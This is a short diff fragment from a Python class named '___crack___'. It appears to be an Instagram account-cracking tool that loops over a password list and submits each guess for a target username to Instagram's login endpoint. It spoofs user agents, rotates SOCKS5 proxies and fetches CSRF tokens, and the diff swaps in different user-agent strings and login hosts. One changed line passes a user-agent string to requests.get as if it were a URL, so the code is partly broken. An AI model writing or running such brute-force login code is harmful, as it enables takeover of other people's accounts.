@@ -415,12 +415,12 @@ class ___crack___:
             ___useragent = open('Data/ua.txt', 'r').read()
         except (IOError):
             ___useragent = ('Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)')  
-            ___roz = requests.get('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36')
+            ___roz = requests.get('NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 216.0.0.12.135 (iPhone 14.2; iOS 15_2; ru-RU; ru-RU; scale=3.00; 1170x2532; 338132253) UNTRUSTED/1.0')
         try:
             for pw in pwx:
                 pw = pw.lower()
-                ___url = ('https://www.instagram.com/')
-                ___login = ('https://www.instagram.com/accounts/login/ajax/')
+                ___url = ('https://z-p42.www.instagram.com/')
+                ___login = ('https://i.instagram.com/accounts/login/ajax/')
                 ___proxy = {'http': 'socks5://%s'%(random.choice(open("Data/proxy2.txt","r").read().splitlines()))}
                 ___csrf = requests.get(___url).cookies['csrftoken']
                 ___data = {'username': uid,
